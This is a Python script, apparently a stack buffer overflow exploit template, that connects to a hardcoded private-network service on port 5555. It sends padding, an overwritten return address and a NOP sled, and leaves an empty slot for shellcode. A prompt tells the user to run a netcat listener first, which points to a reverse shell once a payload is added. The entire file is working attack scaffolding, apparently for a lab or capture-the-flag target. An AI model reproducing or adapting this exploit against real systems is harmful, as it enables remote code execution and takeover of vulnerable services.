#!/usr/bin/env python3

import sys
import socket
import time

TARGET_IP = "192.168.3.42"
TARGET_PORT = 5555
OFFSET = 32
ESP = b"\x30\xdc\xff\xff"
PADDING = 64
SHELLCODE = b""

evil_buffer = b"A" * OFFSET + ESP + b"\x90" * PADDING + SHELLCODE

input("Do not forget to run your netcat listener. PRESS ENTER TO CONTINUE.")

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((TARGET_IP, TARGET_PORT))

server_message = client_socket.recv(8192)  # Delete this if the Client is the first to send the packet
print("[SERVER] OK")                       #

client_socket.send(evil_buffer)
print("[CLIENT] OK")

server_message = client_socket.recv(8192)
print("[SERVER] OK")

print("Press CTRL+C to close the connexion.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    client_socket.close()
print("Connexion closed.")
